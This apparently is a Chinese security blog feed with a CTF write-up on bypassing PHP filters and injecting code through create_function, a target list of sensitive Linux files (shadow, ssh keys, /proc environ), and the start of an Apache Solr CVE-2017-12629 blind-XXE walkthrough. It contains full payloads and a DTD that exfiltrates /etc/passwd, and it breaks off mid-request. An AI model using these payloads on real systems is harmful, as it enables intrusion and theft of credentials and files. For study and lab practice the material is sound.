class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>考点 一：绕过 QUERY_STRING 的正则匹配</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">    preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">    )</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>QUERY_STRING相关知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;aaa&#x2F;index.php?p&#x3D;222&amp;q&#x3D;333</span><br><span class="line">结果：</span><br><span class="line">$_SERVER[&#39;QUERY_STRING&#39;] &#x3D; &quot;p&#x3D;222&amp;q&#x3D;333&quot;;</span><br><span class="line">$_SERVER[&#39;REQUEST_URI&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php?p&#x3D;222&amp;q&#x3D;333&quot;;</span><br><span class="line">$_SERVER[&#39;SCRIPT_NAME&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br><span class="line">$_SERVER[&#39;PHP_SELF&#39;] &#x3D; &quot;&#x2F;aaa&#x2F;index.php&quot;;</span><br><span class="line"></span><br><span class="line">由实例可知：</span><br><span class="line">$_SERVER[&quot;QUERY_STRING&quot;] 获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;] 获取 http:&#x2F;&#x2F;localhost 后面的值，包括&#x2F;</span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;] 获取当前脚本的路径，如：index.php</span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure><p>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code> 不会进行 URLDecode，而 <code>$_GET[]</code> 会，所以只要进行 url 编码即可绕过：</p><p><strong>考点二： preg_match在非/s模式绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br></pre></td></tr></table></figure><p>首先对于file过滤了http和https，然后就是对于GET参数的debu，需要匹配要正则但是又不能和aqua_is_cute这个字符串一样。考虑到preg_match在非/s模式下，会忽略末尾的%0a，因为可以用aqua_is_cute%0a来绕过。又因为aqua_is_cute中有单词被过滤了，因此同样需要用url编码来绕过。</p><p>但是<code>$_GET[&quot;file&quot;]</code>又应该怎么给值呢？考虑到这个：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br></pre></td></tr></table></figure><p>因此利用php的伪协议：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,debu_debu_aqua</span><br></pre></td></tr></table></figure><p><strong>考点 三：绕过 <code>$_REQUEST</code> 的字母匹配</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说不允许有字母。我也卡在了这里，没有想到如果POST和GET传相同名字的参数结果会是怎么样。因为POST的优先级比GET高，如果参数名相同，最终<code>$_REQUEST</code>中的值应该是POST里那个参数的，因此可以传：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debu&#x3D;1&amp;file&#x3D;2</span><br></pre></td></tr></table></figure><p>这个优先级是由 php 的配置文件决定的，在 php.ini 中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">; This directive determines <span class="built_in">which</span> super global arrays are registered when PHP</span><br><span class="line">; starts up. G,P,C,E &amp; S are abbreviations <span class="keyword">for</span> the following respective super</span><br><span class="line">; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty</span><br><span class="line">; paid <span class="keyword">for</span> the registration of these arrays and because ENV is not as commonly</span><br><span class="line">; used as the others, ENV is not recommended on productions servers. You</span><br><span class="line">; can still get access to the environment variables through getenv() should you</span><br><span class="line">; need to.</span><br><span class="line">; Default Value: <span class="string">"EGPCS"</span></span><br><span class="line">; Development Value: <span class="string">"GPCS"</span></span><br><span class="line">; Production Value: <span class="string">"GPCS"</span>;</span><br><span class="line">; http://php.net/variables-order</span><br><span class="line">variables_order = <span class="string">"GPCS"</span></span><br><span class="line"></span><br><span class="line">; This directive determines <span class="built_in">which</span> super global data (G,P &amp; C) should be</span><br><span class="line">; registered into the super global array REQUEST. If so, it also determines</span><br><span class="line">; the order <span class="keyword">in</span> <span class="built_in">which</span> that data is registered. The values <span class="keyword">for</span> this directive</span><br><span class="line">; are specified <span class="keyword">in</span> the same manner as the variables_order directive,</span><br><span class="line">; EXCEPT one. Leaving this value empty will cause PHP to use the value <span class="built_in">set</span></span><br><span class="line">; <span class="keyword">in</span> the variables_order directive. It does not mean it will leave the super</span><br><span class="line">; globals array REQUEST empty.</span><br><span class="line">; Default Value: None</span><br><span class="line">; Development Value: <span class="string">"GP"</span></span><br><span class="line">; Production Value: <span class="string">"GP"</span></span><br><span class="line">; http://php.net/request-order</span><br><span class="line">request_order = <span class="string">"GP"</span></span><br></pre></td></tr></table></figure><p>考点 四：sha1数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点 五：create_function()的代码注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) ||</span><br><span class="line">    preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析create_function() &amp;&amp; 复现wp: <a href="https://paper.seebug.org/94/" target="_blank" rel="noopener">https://paper.seebug.org/94/</a><br>应用到本题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$code(<span class="string">''</span>, $arg);</span><br></pre></td></tr></table></figure><p>$code是create_function,因此这个匿名函数可以是这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">$arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让$arg是}var_dump(get_defined_vars);//<br>则变成了这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;var_dump(get_defined_vars);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>首先用}闭合掉test函数，然后自己写危险的语句，最终用//把}给注释掉。<br>网上的可能大多是用/<em>，其实如果用/</em>，你就可以理解成这样：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;var_dump(get_defined_vars);<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure><p><code>get_defined_vars</code> — 返回由所有已定义变量所组成的数组 </p><p>最后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;;var_dump(get_defined_vars());&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;1nD3x.php?shana[]&#x3D;1&amp;passwd[]&#x3D;3&amp;file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua&amp;debu&#x3D;aqua_is_cute%0a&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">debu&#x3D;&amp;file&#x3D;</span><br></pre></td></tr></table></figure><p>这里看到最后的flag在rea1fl4g.php中，使用require加base64编码加取反替代var_dump(get_defined_vars())<br>‘<br>require(php://filter/convert.base64-encode/resource=rea1fl4g.php)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">'php://filter/convert.base64-encode/resource=rea1fl4g.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$s);</span><br><span class="line"><span class="comment">#%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;&amp;%66%6c%61%67[%63%6f%64%65]&#x3D;create_function&amp;%66%6c%61%67[%61%72%67]&#x3D;&#125;;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">debu&#x3D;&amp;file&#x3D;</span><br></pre></td></tr></table></figure><p>url编码的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s=<span class="string">'shana[]=1&amp;passwd[]=3&amp;file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;flag[arg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%99%93%9E%98%D1%8F%97%8F));//&amp;flag[code]=create_function'</span>;</span><br><span class="line">$result=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($s);$i++)&#123;</span><br><span class="line">    $tmp=substr($s, $i,<span class="number">1</span>);</span><br><span class="line">   <span class="comment"># print($tmp);</span></span><br><span class="line">    <span class="keyword">if</span>(!strcmp($tmp, <span class="string">"%"</span>))&#123;</span><br><span class="line">        $result .= substr($s, $i,<span class="number">3</span>);</span><br><span class="line">        $i +=<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[a-zA-Z_]/i"</span>, $tmp))&#123;</span><br><span class="line">          $result .=<span class="string">"%"</span>.dechex(ord($tmp));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          $result .=$tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span>($result);</span><br></pre></td></tr></table></figure><h1 id="php反序列化原生类利用"><a href="#php反序列化原生类利用" class="headerlink" title="php反序列化原生类利用"></a>php反序列化原生类利用</h1><p><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></p><h1 id="CTF任意读取重要信息文件"><a href="#CTF任意读取重要信息文件" class="headerlink" title="CTF任意读取重要信息文件"></a>CTF任意读取重要信息文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">(1)&#x2F;etc目录</span><br><span class="line">&#x2F;etc目录下多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。</span><br><span class="line">(2)&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;passwd文件是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读，一般被用作Linux系统下文件读取漏洞存在性判断的基准。读到这个文件我们就可以知道系统存在哪些用户、他们所属的组是什么、工作目录是什么。</span><br><span class="line">(3)&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;shadow是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下，这个文件是不可读的。</span><br><span class="line">(4)&#x2F;etc&#x2F;apache2&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;是Apache配置文件，可以获知Web目录、服务端口等信息。CTF有些题目需要参赛者确认Web路径。</span><br><span class="line">(5)&#x2F;etc&#x2F;nginx&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。</span><br><span class="line">(6)&#x2F;etc&#x2F;apparmor(.d)&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;apparmor（.d）&#x2F;是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如，通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF（User Defined Functions）执行系统命令。</span><br><span class="line">(7)&lt;code&gt;&#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)&lt;&#x2F;code&gt;</span><br><span class="line">&#x2F;etc&#x2F;（cron.d&#x2F;|crontab）是定时任务文件。有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。</span><br><span class="line">(8)&#x2F;etc&#x2F;environment</span><br><span class="line">&#x2F;etc&#x2F;environment是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。</span><br><span class="line">(9)&#x2F;etc&#x2F;hostname&#x2F;etc&#x2F;hostname表示主机名。</span><br><span class="line">(10)&#x2F;etc&#x2F;hosts&#x2F;etc&#x2F;hosts是主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，参赛者可以探测网卡信息和内网IP&#x2F;域名。</span><br><span class="line">(11)&#x2F;etc&#x2F;issue</span><br><span class="line">&#x2F;etc&#x2F;issue指明系统版本。</span><br><span class="line">(12)&#x2F;etc&#x2F;mysql&#x2F;*</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;是MySQL配置文件。</span><br><span class="line">(13)&#x2F;etc&#x2F;php&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;*是PHP配置文件。</span><br><span class="line">&#x2F;proc目录</span><br><span class="line"></span><br><span class="line">&#x2F;proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。注意：如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需&#x2F;proc&#x2F;self&#x2F;代替&#x2F;proc&#x2F;[pid]&#x2F;即可。</span><br><span class="line">对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx-pxxxx登录MySQL，会在cmdline中显示明文密码：</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;cmdline    ([pid]指向进程所对应的终端命令)</span><br><span class="line">有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;cmd&#x2F;  ([pid]指向进程的运行目录）</span><br><span class="line">环境变量中可能存在secret_key，这时也可以通过environ进行读取：</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;environ  ([pid]指向进程运行时的环境变量)</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[num]读取，这个目录包含了进程打开的每一个文件的链接</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其他目录</span><br><span class="line">Nginx配置文件可能存在其他路径：</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;*    (源代码安装或其他一些系统)</span><br><span class="line">日志文件：</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;*    (经常出现Apache2的Web应用可读&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access&#x2F;log从而分析日志，盗取其他选手的解题步骤)</span><br><span class="line">Apache默认Web根目录：</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">PHP session目录：</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;php(5)&#x2F;sessions&#x2F;  (泄露用户session)</span><br><span class="line">用户目录：</span><br><span class="line">[user_dir_you_know]&#x2F;.bash_history  (泄露历史执行命令)</span><br><span class="line">[user_dir_you_know]&#x2F;.bashrc  (部分环境变量)</span><br><span class="line">[user_dir_you_know]&#x2F;.ssh&#x2F;id_rsa(.pub) (ssh登录私钥&#x2F;公钥)</span><br><span class="line">[user_dir_you_know]&#x2F;.viminfo  （vim使用记录）</span><br><span class="line">[pid]指向进程所对应的可执行文件。有时我们想读取当前应用的可执行文件再进行分析，但在实际利用时可能存在一些安全措施阻止我们去读可执行文件，这时可以尝试读取&#x2F;proc&#x2F;self&#x2F;exe。例如：</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;(1|2)  (读取[pid]指向进程的stdout或stderror或其他)</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;maps  ([pid]指向进程的内存映射)</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;(mounts|mountinfo)  ([pid]指向进程所在的文件系统挂载情况，CTF常见的是docker环境这时mount会泄露一些敏感路径)</span><br><span class="line">&#x2F;proc&#x2F;[pid]&#x2F;net&#x2F;*  ([pid]指向进程的网络信息，如读取TCP将获取进程所绑定的TCP端口ARP将泄露网段内网IP信息)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;零散的知识点记录&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache-solr相关漏洞</title>
    <link href="https://blog.cfyqy.com/article/1641caa.html"/>
    <id>https://blog.cfyqy.com/article/1641caa.html</id>
    <published>2021-04-15T16:00:17.000Z</published>
    <updated>2021-04-16T10:02:35.423Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。  </p><a id="more"></a><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>详情可看：<a href="https://xz.aliyun.com/t/9321" target="_blank" rel="noopener">Apache Solr 组件安全概览</a>   </p><p>环境搭建：<br>Solr 所有版本下载地址 <a href="http://archive.apache.org/dist/lucene/solr/" target="_blank" rel="noopener">http://archive.apache.org/dist/lucene/solr/</a><br>下载Solr ,进入bin目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solr.cmd -f -a &quot;-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;10010&quot; -port 8983 -s &quot;G:\code\java\solr-7.1.0\example\example-DIH\solr&quot;</span><br></pre></td></tr></table></figure><p>动态调试<br>下载源码，配置Remote即可</p><h1 id="Apache-solr-XML-实体注入漏洞（CVE-2017-12629）"><a href="#Apache-solr-XML-实体注入漏洞（CVE-2017-12629）" class="headerlink" title="Apache solr XML 实体注入漏洞（CVE-2017-12629）"></a>Apache solr XML 实体注入漏洞（CVE-2017-12629）</h1><p>此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。    </p><p>由于返回包中不包含我们传入的XML中的信息，所以这是一个Blind XXE漏洞，我们发送如下数据包（自行修改其中的XXE Payload）：</p><p>替换先dnslog地址，看是否有XXE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2Fbaidu.com%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&amp;wt&#x3D;xml&amp;defType&#x3D;xmlparser HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Blind XXE漏洞利用</p><p>起一个web服务，放入1.dtd，dtd文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &#39;:%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>请求（记得替换ip地址）</p><figure class="highlight plain"><table><tr><td 